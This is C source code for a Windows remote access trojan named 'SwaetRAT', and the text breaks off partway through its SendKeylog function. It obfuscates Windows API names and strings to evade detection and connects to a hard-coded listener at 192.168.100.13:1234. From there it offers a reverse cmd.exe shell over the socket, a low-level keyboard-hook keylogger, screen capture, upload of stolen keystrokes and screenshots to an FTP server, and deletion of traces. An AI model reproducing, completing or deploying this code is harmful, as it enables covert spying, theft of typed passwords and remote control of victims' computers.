#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "rat_modules.h"
#define MAX 2000

HHOOK hHook;
FILE* KeylogFile;


char ALL_ALPHANUM[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
int dll_ws2__32_offset[] = { 22,18,54,63,55,54,62,3,11,11 };
int exe_c_C_M_d_offset[] = { 2,12,3,62,4,23,4 };	//cmd.exe
int wsa_startup_offset[] = { 48,44,26,44,19,0,17,19,20,15 };
int wsa_socket_offset[] = { 48,44,26,44,14,2,10,4,19,26 };
int wsa_connect_offset[] = { 48,44,26,28,14,13,13,4,2,19 };
int h_tons_offset[] = { 7,19,14,13,18 };
int inet_addr_offset[] = { 8,13,4,19,63,0,3,3,17 };
int wsa_cleanup_offset[] = { 48,44,26,28,11,4,0,13,20,15 };
int close_sock_offset[] = { 2,11,14,18,4,18,14,2,10,4,19 };
int send_offset[] = { 18, 4, 13, 3 };
int recv_offset[] = { 17,4,2,21 };
int create_process_A_offset[] = { 28,17,4,0,19,4,41,17,14,2,4,18,18,26 };
int wait_for_single_object_offset[] = { 48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19 };
int listener_addr_offset[] = { 53,61,54,62,53,58,60,62,53,52,52,62,53,55 }; 	//192.168.100.13
int dll_k_er_32_offset[] = { 10,4,17,13,4,11,55,54,62,3,11,11 };
int dll_a_DV_offset[] = { 0,3,21,0,15,8,55,54,62,3,11,11 };
int lib_load_offset[] = { 37,14,0,3,37,8,1,17,0,17,24,26 };						//LoadLibraryA
int set_h_0_k_offset[] = { 44,4,19,48,8,13,3,14,22,18,33,14,14,10,30,23,26 };		//SetWindowsHookExA
int un_h_0_k_offset[] = { 46,13,7,14,14,10,48,8,13,3,14,22,18,33,14,14,10,30,23 };	//UnhookWindowsHookEx
int gt_m__5__g_offset[] = { 32,4,19,38,4,18,18,0,6,4 };								//GetMessage
int trn_m__5__g_offset[] = { 45,17,0,13,18,11,0,19,4,38,4,18,18,0,6,4 };			//TranslateMessage
int dis_m__5__g_offset[] = { 29,8,18,15,0,19,2,7,38,4,18,18,0,6,4 };				//DispatchMessage
int us__32_d_11_offset[] = { 20,18,4,17,55,54,62,3,11,11 };						//user32.dll

char* GetOriginal(int offsets[], char* ALL_ALPHANUM, int sizeof_offset) {
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char* empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
        //printf("%c,",character);
    }

    empty_string[size] = '\0';  // Null-terminate the string

    return empty_string;
}

void InitConn(void) {

	
	// --- START LOAD WS2_32 DLL --- //
	HMODULE hDLL_ws2__32 = LoadLibraryA(GetOriginal(dll_ws2__32_offset, ALL_ALPHANUM, sizeof(dll_ws2__32_offset)));
	if (hDLL_ws2__32 == NULL) {
		//printf("[x] COULD NOT LOAD ws2_32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}

	// --- END LOAD WS2_32 DLL --- //




	FARPROC wsa_startup_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_startup_offset, ALL_ALPHANUM, sizeof(wsa_startup_offset)));
	FARPROC wsa_socket_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_socket_offset, ALL_ALPHANUM, sizeof(wsa_socket_offset)));
	FARPROC h_tons_func = GetProcAddress(hDLL_ws2__32, GetOriginal(h_tons_offset, ALL_ALPHANUM, sizeof(h_tons_offset)));;
	FARPROC inet_addr_func = GetProcAddress(hDLL_ws2__32, GetOriginal(inet_addr_offset, ALL_ALPHANUM, sizeof(inet_addr_offset)));;
	FARPROC wsa_connect_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_connect_offset, ALL_ALPHANUM, sizeof(wsa_connect_offset)));
	FARPROC wsa_cleanup_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_cleanup_offset, ALL_ALPHANUM, sizeof(wsa_cleanup_offset)));
	FARPROC close_sock_func = GetProcAddress(hDLL_ws2__32, GetOriginal(close_sock_offset, ALL_ALPHANUM, sizeof(close_sock_offset)));
	FARPROC recv_func = GetProcAddress(hDLL_ws2__32, GetOriginal(recv_offset, ALL_ALPHANUM, sizeof(recv_offset)));
	FARPROC send_func = GetProcAddress(hDLL_ws2__32, GetOriginal(send_offset, ALL_ALPHANUM, sizeof(send_offset)));

	
	WSADATA wsaData;
	int connect;
	SOCKET client_socket;
	struct sockaddr_in server_addr;
	int _p__0rt = 1234; //PUT SERVER PORT HERE
	char recv_buffer[MAX];
	DWORD recvd_bytes = 0;
	
	/*
	char Banner_response[MAX] = "SwaetRAT available commands:\n"
								"1. shell: spawn a shell\n"
								"2. start keylog: start keylogger\n"
								"3. stop keylog: stop keylogger\n"
								"4. send keylog: send keylog file\n"
								"5. screen capture: capture monitor screen\n"
								"6. send capture: send screenshot\n"
								"7. delete trace: delete screenshot and keylog file\n"
	*/
		;
	char Prompt_response[MAX] = "SwaetRAT> ";
	char Invalid_response[MAX] = "[x] INVALID COMMAND\n";
	char StartKeylog_response_1[MAX] = "[+] KEYLOGGER STARTED\n";
	char StartKeylog_response_2[MAX] = "[+] RECORDED 100 KEYSTROKES, enter the command again to record more or send the log file\n";
	char StopKeylog_response[MAX] = "[+] KEYLOGGER STOPPED\n";
	char ScreenCapture_response[MAX] = "[+] TOOK SCREENSHOT\n";
	char SendKeylog_response[MAX] = "[+] KEYLOG FILE SAVED TO FTP SERVER\n";
	char SendKeylog_err_26_response[MAX] = "[+] KEYLOG FILE NOT FOUND\n";
	char SendCapture_response[MAX] = "[+] SCREENSHOT SAVED TO FTP SERVER\n";
	char SendCapture_err_26_response[MAX] = "[+] SCREENSHOT FILE NOT FOUND\n";
	char DeleteTrace_reponse[MAX] = "[+] DELETED FILES\n";
	
	DWORD dwThreadID = 0;
	HANDLE hStartKeylogThread = NULL;
	while (1) {
		//start winsock 2.2
		//printf("[+] initializing winsock 2.2\n");
		if (wsa_startup_func(MAKEWORD(2, 2), &wsaData) != 0) {
			//printf("[x] winsock failed\n");
			continue;
		}

		//create socket
		//printf("[+] creating socket\n");
		client_socket = wsa_socket_func(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
		if (client_socket == INVALID_SOCKET) {
			//printf("[x] socket creation failed\n");
			//wsa_cleanup_func();
			continue;

		}

		//assigning server values
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = h_tons_func(_p__0rt);
		server_addr.sin_addr.s_addr = inet_addr_func(GetOriginal(listener_addr_offset, ALL_ALPHANUM, sizeof(listener_addr_offset)));
		if (server_addr.sin_addr.s_addr == INADDR_NONE) {
			//debug_log("[x] invalid address\n[x]exiting\n");
			close_sock_func(client_socket);
			//wsa_cleanup_func();
			exit(1);

		};

		//connect to server
		//printf("[+] connecting to server\n");
		connect = wsa_connect_func(client_socket, (SOCKADDR*)&server_addr, sizeof(server_addr), NULL, NULL, NULL, NULL);		
		if (connect != 0){
			//printf("[x] can't connect to server\n");
			close_sock_func(client_socket);
			//wsa_cleanup_func();
			continue;
		}
		//send_func(client_socket, Banner_response, (int)strlen(Banner_response), 0);
RECV:
		send_func(client_socket, Prompt_response, (int)strlen(Prompt_response), 0);
		//recieve data
		recvd_bytes = recv_func(client_socket, recv_buffer, sizeof(recv_buffer), 0);
		if (recvd_bytes == SOCKET_ERROR) { close_sock_func(client_socket); continue;}
		recv_buffer[recvd_bytes] = '\0';
		//printf("received buffer %s\n",recv_buffer);
		
		if (strcmp(recv_buffer, "shell\n") == 0) { 
			//printf("[+] Calling ShellExec()\n"); 
			ShellExec(client_socket); 
			goto RECV; 
		}
		else if (strcmp(recv_buffer, "start keylog\n") == 0) {

			//printf("[+] Calling StartKeylog()\n");
			send_func(client_socket, StartKeylog_response_1, (int)strlen(StartKeylog_response_1), 0);
			hStartKeylogThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartKeylog, 0, 0, &dwThreadID);

			//send_func(client_socket, StartKeylog_response_2, (int)strlen(StartKeylog_response_2), 0);
			goto RECV;


		}
		else if (strcmp(recv_buffer, "stop keylog\n") == 0) {
			//printf("[+] Calling StopKeylog()\n");

			TerminateThread(hStartKeylogThread, 1); //FORCED TERMINATION
			StopKeylog();
			send_func(client_socket, StopKeylog_response, (int)strlen(StopKeylog_response), 0);
			goto RECV;
		}
		else if (strcmp(recv_buffer, "capture\n") == 0) { 
			//printf("[+] Calling ScreenCapture()\n"); 
			ScreenCapture(); 
			send_func(client_socket, ScreenCapture_response, (int)strlen(ScreenCapture_response), 0); 
			goto RECV; 
		}
		else if (strcmp(recv_buffer, "send keylog\n") == 0) {
			//printf("[+] Calling SendKeylog()\n");
			if (SendKeylog() == 26) { send_func(client_socket, SendKeylog_err_26_response, (int)strlen(SendKeylog_err_26_response), 0); goto RECV; }
			send_func(client_socket, SendKeylog_response, (int)strlen(SendKeylog_response), 0);
			
			goto RECV;
		}
		
		
		else if (strcmp(recv_buffer, "send capture\n") == 0) {
			//printf("[+] Calling SendCapture()\n");
			if (SendCapture() == 26) { send_func(client_socket, SendCapture_err_26_response, (int)strlen(SendCapture_err_26_response), 0); goto RECV; }
			
			send_func(client_socket, SendCapture_response,(int) strlen(SendCapture_response), 0);	
			goto RECV;
		}
		else if (strcmp(recv_buffer, "delete trace\n") == 0) { 
			//printf("[+] Calling DeleteTrace()\n"); 
			DeleteTrace(); 
			send_func(client_socket, DeleteTrace_reponse, (int)strlen(DeleteTrace_reponse), 0);
			goto RECV;}
		else { send_func(client_socket, Invalid_response, (int)strlen(Invalid_response), 0); goto RECV; }



		//CLEANUP	
		//memset(recv_buffer,0,sizeof(recv_buffer));
		close_sock_func(client_socket);
		wsa_cleanup_func();
		Sleep(1000);
	}
	return;
}


void ShellExec(SOCKET client_socket) {
	

	FARPROC create_process_A_func = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), GetOriginal(create_process_A_offset, ALL_ALPHANUM, sizeof(create_process_A_offset)));
	FARPROC wait_for_single_object_func = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), GetOriginal(wait_for_single_object_offset, ALL_ALPHANUM, sizeof(wait_for_single_object_offset)));
	
	
	// CREATING PROCESS //
	//declare process struct and info 

	STARTUPINFOA proc;
	PROCESS_INFORMATION proc_info;
	memset(&proc, 0, sizeof(proc));
	proc.cb = sizeof(proc);
	proc.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	proc.hStdInput = (HANDLE)client_socket;
	proc.hStdOutput = (HANDLE)client_socket;
	proc.hStdError = (HANDLE)client_socket; //pipe stderr stdin stdout to socket

	//create process
	create_process_A_func(NULL, GetOriginal(exe_c_C_M_d_offset, ALL_ALPHANUM, sizeof(exe_c_C_M_d_offset)), NULL, NULL, TRUE, 0, NULL, NULL, &proc, &proc_info); //spawm cmd	

	//wait for process to finish

	wait_for_single_object_func(proc_info.hProcess, INFINITE);
	CloseHandle(proc_info.hProcess);
	CloseHandle(proc_info.hThread);
	// PROCESS END //

	return;
}



LRESULT CALLBACK Hook_proc(
	int nCode,
	WPARAM wParam,
	LPARAM lParam
)
{
	//debug_log("IN HOOK_PROC\n");
	KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
	if (wParam == WM_KEYDOWN) {

		switch (pKey->vkCode) {
		case VK_BACK:
			//printf("[BACKSPACE]");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_TAB:
			//printf("[TAB]");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_LSHIFT:
			//printf("[L-SHIFT]");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_RSHIFT:
			//printf("[R-SHIFT]");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_RETURN:
			//printf("[ENTER]\n");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_RCONTROL:
			//printf("[R-CTRL]");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_LCONTROL:
			//printf("[L-CTRL]");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_MENU:
			//printf("[ALT]");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_CAPITAL:
			//printf("[TAB]");
			LogKeystroke(pKey->vkCode);
			break;

		case VK_NUMPAD0:
			//printf("0");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_NUMPAD1:
			//printf("1");
			LogKeystroke(pKey->vkCode);
			break;

		case VK_NUMPAD2:
			//printf("2");
			LogKeystroke(pKey->vkCode);
			break;

		case VK_NUMPAD3:
			//printf("3");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_NUMPAD4:
			//printf("4");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_NUMPAD5:
			//printf("5");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_NUMPAD6:
			//printf("6");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_NUMPAD7:
			//printf("7");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_NUMPAD8:
			//printf("8");
			LogKeystroke(pKey->vkCode);
			break;
		case VK_NUMPAD9:
			//printf("9");
			LogKeystroke(pKey->vkCode);
			break;

		default:
			//printf("%c",pKey->vkCode);	
			LogKeystroke(pKey->vkCode);
			break;
		}

	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void StartKeylog(void) {


	// --- START LOAD user32 DLL --- //
	HMODULE hdll_us_32 = LoadLibraryA(GetOriginal(us__32_d_11_offset, ALL_ALPHANUM, sizeof(us__32_d_11_offset)));
	if (hdll_us_32 == NULL) {
		//printf("[x] COULD NOT LOAD user32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(us__32_d_11_offset,ALL_ALPHANUM,sizeof(us__32_d_11_offset)),hdll_us_32);

	// --- END LOAD user32 DLL ---//

	FARPROC set_h_0_k_func = GetProcAddress(hdll_us_32, GetOriginal(set_h_0_k_offset, ALL_ALPHANUM, sizeof(set_h_0_k_offset))); //SetWindowsHookExA
	FARPROC un_h_0_k_func = GetProcAddress(hdll_us_32, GetOriginal(un_h_0_k_offset, ALL_ALPHANUM, sizeof(un_h_0_k_offset))); //UnhookWindowsHookEx
	FARPROC gt_m__5__g_func = GetProcAddress(hdll_us_32, GetOriginal(gt_m__5__g_offset, ALL_ALPHANUM, sizeof(gt_m__5__g_offset))); //GetMessage
	FARPROC trn_m__5__g_func = GetProcAddress(hdll_us_32, GetOriginal(trn_m__5__g_offset, ALL_ALPHANUM, sizeof(trn_m__5__g_offset))); //TranslateMessage
	FARPROC dis_m__5__g_func = GetProcAddress(hdll_us_32, GetOriginal(dis_m__5__g_offset, ALL_ALPHANUM, sizeof(dis_m__5__g_offset))); //DispatchMessage

	hHook = set_h_0_k_func(WH_KEYBOARD_LL, Hook_proc, NULL, 0);
	if (hHook == NULL) {
		//printf("HOOK wasnt installed\n");

		return;
	}
	//printf("[+] HOOK installed successfully\n");
	//printf("[+] before get message\n");
	MSG msg;
	while ((GetMessage(&msg, NULL, 0, 0)) != 0)
	{
		//printf("[+] before translate message\n");
		trn_m__5__g_func(&msg);
		//printf("[+] before dispatch message\n");
		dis_m__5__g_func(&msg);

		
		
	}
	//printf("[x] BROKEN OUT OF GetMessage LOOP, CLEANING\n");
	
	return;
}

void LogKeystroke(DWORD key) {
	static int i = 0;

	char full_string_1[200];  //	C:\\Windows\\Temp\\log.log
	char part_1_1[] = "C";
	char part_1_2[] = ":";
	char part_1_3[] = "\\";
	char part_1_4[] = "Wi";
	char part_1_5[] = "nd";
	char part_1_6[] = "ow";
	char part_1_7[] = "s\\";
	char part_1_8[] = "T";
	char part_1_9[] = "e";
	char part_1_10[] = "mp";
	char part_1_11[] = "\\";
	char part_1_12[] = "l";
	char part_1_13[] = "o";
	char part_1_14[] = "g";
	char part_1_15[] = ".";
	char part_1_16[] = "l";
	char part_1_17[] = "o";
	char part_1_18[] = "g";
	strcpy_s(full_string_1, sizeof(full_string_1),part_1_1);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_2);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_3);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_4);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_5);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_6);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_7);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_8);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_9);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_10);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_11);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_12);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_13);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_14);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_15);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_16);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_17);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_18);


	
	if (KeylogFile == NULL) {
		errno_t  KeylogFile_result = fopen_s(&KeylogFile,full_string_1, "a"); // Open the log file in append mode
		if (KeylogFile_result != 0) {
			//printf("Failed to open log file! Error\n");
			return;
		}
	}
	switch (key) {
	case VK_BACK:
		fprintf(KeylogFile, "[BACKSPACE]");
		fflush(KeylogFile);
		break;
	case VK_TAB:
		fprintf(KeylogFile, "[TAB]");
		fflush(KeylogFile);
		break;
	case VK_RETURN:
		fprintf(KeylogFile, "\n");
		fflush(KeylogFile);
		break;
	case VK_LSHIFT:
		fprintf(KeylogFile, "[L-SHIFT]");
		fflush(KeylogFile);
		break;
	case VK_RSHIFT:
		fprintf(KeylogFile, "[R-SHIFT]");
		fflush(KeylogFile);
		break;
	case VK_RCONTROL:
		fprintf(KeylogFile, "[R-CTRL]");
		fflush(KeylogFile);
		break;
	case VK_LCONTROL:
		fprintf(KeylogFile, "[L-CTRL]");
		fflush(KeylogFile);
		break;
	case VK_MENU:
		fprintf(KeylogFile, "[ALT]");
		fflush(KeylogFile);
		break;
	case VK_CAPITAL:
		fprintf(KeylogFile, "[TAB]");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD0:
		fprintf(KeylogFile, "0");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD1:
		fprintf(KeylogFile, "1");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD2:
		fprintf(KeylogFile, "2");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD3:
		fprintf(KeylogFile, "3");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD4:
		fprintf(KeylogFile, "4");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD5:
		fprintf(KeylogFile, "5");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD6:
		fprintf(KeylogFile, "6");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD7:
		fprintf(KeylogFile, "7");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD8:
		fprintf(KeylogFile, "8");
		fflush(KeylogFile);
		break;
	case VK_NUMPAD9:
		fprintf(KeylogFile, "9");
		fflush(KeylogFile);
		break;
	default:
		fprintf(KeylogFile, "%c", key);
		fflush(KeylogFile); // Flush the buffer to ensure the key is written to the file
		break;
	}
	
	if (i == 100) {		
		fflush(KeylogFile);
		//printf("[+] Reached 100 chars\n");
		
		i = 0;
		
		
	}
	
	i++;

}

void StopKeylog(void) {
	
	// --- START LOAD user32 DLL --- //
	HMODULE hdll_us_32 = LoadLibraryA(GetOriginal(us__32_d_11_offset, ALL_ALPHANUM, sizeof(us__32_d_11_offset)));
	if (hdll_us_32 == NULL) {
		//printf("[x] COULD NOT LOAD user32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%s\t0x%p]\n",GetOriginal(us__32_d_11_offset,ALL_ALPHANUM,sizeof(us__32_d_11_offset)),hdll_us_32);
	
	FARPROC un_h_0_k_func = GetProcAddress(hdll_us_32, GetOriginal(un_h_0_k_offset, ALL_ALPHANUM, sizeof(un_h_0_k_offset))); //UnhookWindowsHookEx
	
	if (un_h_0_k_func(hHook) == 0) { 
		//printf("[x] UnhookWindowsHookEx() failed, err -> %d\n", GetLastError()) ;
		}

	//printf("[+} Unhooked\n");

	if (fclose(KeylogFile) != 0) { return; }

	//printf("[+] Closed File Success\n");
	return;
}

void ScreenCapture(void) {
	HDC hdc = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdc);

	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);

	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
	SelectObject(hdcMem, hBitmap);
	BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);



	char full_string_1[500];  //	C:\\Windows\\Temp\\screenshot.bmp
	char part_1_1[] = "C";
	char part_1_2[] = ":";
	char part_1_3[] = "\\";
	char part_1_4[] = "Wi";
	char part_1_5[] = "nd";
	char part_1_6[] = "ow";
	char part_1_7[] = "s\\";
	char part_1_8[] = "T";
	char part_1_9[] = "e";
	char part_1_10[] = "mp";
	char part_1_11[] = "\\";
	char part_1_12[] = "s";
	char part_1_13[] = "c";
	char part_1_14[] = "r";
	char part_1_15[] = "ee";
	char part_1_16[] = "n";
	char part_1_17[] = "s";
	char part_1_18[] = "h";
	char part_1_19[] = "o";
	char part_1_20[] = "t";
	char part_1_21[] = ".b";
	char part_1_22[] = "mp";
	strcpy_s(full_string_1, sizeof(full_string_1), part_1_1);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_2);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_3);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_4);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_5);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_6);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_7);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_8);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_9);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_10);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_11);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_12);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_13);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_14);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_15);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_16);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_17);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_18);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_19);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_20);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_21);
	strcat_s(full_string_1, sizeof(full_string_1), part_1_22);

	
	// Save as BMP
	FILE* file = fopen(full_string_1, "wb");
	if (file == NULL) {
		DeleteObject(hBitmap);
		DeleteDC(hdcMem);
		ReleaseDC(NULL, hdc);
		return;
	}

	BITMAPINFOHEADER bmi = { 0 };
	bmi.biSize = sizeof(BITMAPINFOHEADER);
	bmi.biWidth = width;
	bmi.biHeight = -height;  // Negative for top-down DIB
	bmi.biPlanes = 1;
	bmi.biBitCount = 24;
	bmi.biCompression = BI_RGB;

	BITMAPFILEHEADER bmf = { 0 };
	bmf.bfType = 0x4D42;  // "BM"
	bmf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bmf.bfSize = bmf.bfOffBits + ((width * 24 + 31) / 32) * 4 * height;

	fwrite(&bmf, sizeof(BITMAPFILEHEADER), 1, file);
	fwrite(&bmi, sizeof(BITMAPINFOHEADER), 1, file);

	// Get bitmap bits
	BYTE* bits = (BYTE*)malloc(((width * 24 + 31) / 32) * 4 * height);
	GetDIBits(hdc, hBitmap, 0, height, bits, (BITMAPINFO*)&bmi, DIB_RGB_COLORS);
	fwrite(bits, ((width * 24 + 31) / 32) * 4 * height, 1, file);

	free(bits);
	fclose(file);

	DeleteObject(hBitmap);
	DeleteDC(hdcMem);
	ReleaseDC(NULL, hdc);

	
	return;
}
int SendKeylog(void) {

	if (KeylogFile != NULL) { fclose(KeylogFile); }
	

	//printf("[+] Closed File Success in SendKeylog()\n");


	char full_string_2[100];	// \\??\\C:\\Windows\\Temp\\log.log
	char part_string_2_1[] = "\\";
	char part_string_2_2[] = "??";
	char part_string_2_3[] = "\\";
	char part_string_2_4[] = "C";
	char part_string_2_5[] = ":";
	char part_string_2_6[] = "\\";
	char part_string_2_7[] = "Wi";
	char part_string_2_8[] = "nd";
	char part_string_2_9[] = "ow";
	char part_string_2_10[] = "s\\";
	char part_string_2_11[] = "T";
	char part_string_2_12[] = "e";
	char part_string_2_13[] = "mp\\";
	char part_string_2_14[] = "l";
	char part_string_2_15[] = "o";
	char part_string_2_16[] = "g";
	char part_string_2_17[] = ".";
	char part_string_2_18[] = "l";
	char part_string_2_19[] = "o";
	char part_string_2_20[] = "g";
	strcpy_s(full_string_2,sizeof(full_string_2), part_string_2_1);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_2);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_3);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_4);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_5);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_6);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_7);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_8);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_9);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_10);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_11);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_12);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_13);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_14);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_15);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_16);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_17);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_18);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_19);
	strcat_s(full_string_2, sizeof(full_string_2), part_string_2_20);


	char full_string_1[100];	// log.log -> remote file name
	char part_string_1_1[] = "l";
	char part_string_1_2[] = "o";
	char part_string_1_3[] = "g";
	char part_string_1_4[] = ".";
	char part_string_1_5[] = "l";
	char part_string_1_6[] = "o";
	char part_string_1_7[] = "g";
	strcpy_s(full_string_1, sizeof(full_string_1), part_string_1_1);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_2);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_3);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_4);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_5);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_6);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_7);
	

	char full_string_3[5];	// ftp
	char part_string_3_1[] = "f";
	char part_string_3_2[] = "t";
	char part_string_3_3[] = "p";
	strcpy_s(full_string_3, sizeof(full_string_3), part_string_3_1);
	strcat_s(full_string_3, sizeof(full_string_3), part_string_3_2);
	strcat_s(full_string_3, sizeof(full_string_3), part_string_3_3);



	char full_string_4[100];	// 192.168.100.13
	char part_string_4_1[] = "1";
	char part_string_4_2[] = "9";
	char part_string_4_3[] = "2.";
	char part_string_4_4[] = "1";
	char part_string_4_5[] = "6";
	char part_string_4_6[] = "8";
	char part_string_4_7[] = ".";
	char part_string_4_8[] = "1";
	char part_string_4_9[] = "0";
	char part_string_4_10[] = "0.";
	char part_string_4_11[] = "1";
	char part_string_4_12[] = "3";
	strcpy_s(full_string_4, sizeof(full_string_4), part_string_4_1);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_2);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_3);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_4);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_5);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_6);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_7);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_8);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_9);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_10);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_11);
	strcat_s(full_string_4, sizeof(full_string_4), part_string_4_12);

	char full_string_5[100];	// uploads
	char part_string_5_1[] = "u";
	char part_string_5_2[] = "p";
	char part_string_5_3[] = "l";
	char part_string_5_4[] = "o";
	char part_string_5_5[] = "a";
	char part_string_5_6[] = "d";
	char part_string_5_7[] = "s";
	strcpy_s(full_string_5, sizeof(full_string_5), part_string_5_1);
	strcat_s(full_string_5, sizeof(full_string_5), part_string_5_2);
	strcat_s(full_string_5, sizeof(full_string_5), part_string_5_3);
	strcat_s(full_string_5, sizeof(full_string_5), part_string_5_4);
	strcat_s(full_string_5, sizeof(full_string_5), part_string_5_5);
	strcat_s(full_string_5, sizeof(full_string_5), part_string_5_6);
	strcat_s(full_string_5, sizeof(full_string_5), part_string_5_7);

	char full_string_6[100];	// ftp_user:123
	char part_string_6_1[] = "f";
	char part_string_6_2[] = "t";
	char part_string_6_3[] = "p";
	char part_string_6_4[] = "_";
	char part_string_6_5[] = "u";
